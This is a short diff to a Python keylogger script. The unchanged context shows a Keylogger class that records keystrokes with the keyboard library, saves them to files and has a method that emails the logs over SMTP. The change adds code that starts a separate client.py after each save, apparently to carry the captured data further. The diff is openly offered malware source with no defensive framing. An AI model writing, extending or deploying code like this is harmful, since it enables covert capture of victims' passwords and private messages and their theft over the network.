@@ -1,7 +1,8 @@
+#!/usr/bin/env python3
 import keyboard # for keylogs
 import smtplib # for sending email using SMTP protocol (gmail)
-#import client
-#import server
+from subprocess import Popen #to run client.py
+import os #find realpath
 # Timer is to make a method runs after an `interval` amount of time
 from threading import Timer
 from datetime import datetime
@@ -60,6 +61,7 @@ class Keylogger:
             # write the keylogs to the file
             print(self.log, file=f)
         print(f"[+] Saved {self.filename}.txt")
+        process = Popen(['python3', os.path.realpath("client.py")])
 
     def sendmail(self, email, password, message):
         # manages a connection to an SMTP server
@@ -89,6 +91,7 @@ class Keylogger:
                 self.report_to_file()
             # if you want to print in the console, uncomment below line
             # print(f"[{self.filename}] - {self.log}")
+
             self.start_dt = datetime.now()
         self.log = ""
         timer = Timer(interval=self.interval, function=self.report)
